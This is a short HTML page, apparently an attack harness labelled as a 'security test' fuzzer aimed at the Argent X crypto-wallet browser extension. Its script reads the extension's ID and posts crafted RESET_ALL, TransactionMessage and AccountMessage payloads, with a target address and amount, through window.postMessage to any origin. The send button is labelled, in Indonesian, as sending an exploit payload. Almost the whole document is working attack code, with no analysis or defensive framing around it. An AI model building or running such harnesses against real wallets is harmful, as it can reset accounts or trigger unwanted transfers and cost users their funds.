<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Advanced Wallet Fuzzer</title>
</head>
<body>
    <h1>Security Test: Transaction Fuzzer</h1>
    
    <div>
        <label>Pilih Tipe:</label>
        <select id="msgType">
            <option value="RESET_ALL">RESET_ALL</option>
            <option value="TransactionMessage">TransactionMessage</option>
            <option value="AccountMessage">AccountMessage</option>
        </select>
    </div>

    <div style="margin-top: 10px;">
        <label>Payload (JSON):</label><br>
        <textarea id="payloadData" rows="5" style="width: 100%;">
{
  "to": "0xTargetAddress...",
  "amount": "0.01",
  "data": "0x"
}
        </textarea>
    </div>

    <button id="sendBtn" style="padding: 15px; margin-top: 10px; background: red; color: white;">Kirim Payload Eksploit</button>
    <pre id="log" style="background: #eee; padding: 10px; margin-top: 10px;"></pre>

    <script>
        const log = (msg) => document.getElementById('log').innerText += msg + '\n';

        document.getElementById('sendBtn').addEventListener('click', () => {
            const type = document.getElementById('msgType').value;
            let customData = {};
            
            try {
                customData = JSON.parse(document.getElementById('payloadData').value);
            } catch (e) {
                log("Error: Format JSON salah!");
                return;
            }

            const extId = document.getElementById("argent-x-extension")?.getAttribute("data-extension-id") || "unknown";
            
            const payload = {
                type: type,
                extensionId: extId,
                ...customData // Menyertakan data transaksi/akun
            };

            log("Mengirim: " + JSON.stringify(payload));
            window.postMessage(payload, "*"); 
            log("Pesan dikirim.");
        });
    </script>
</body>
</html>
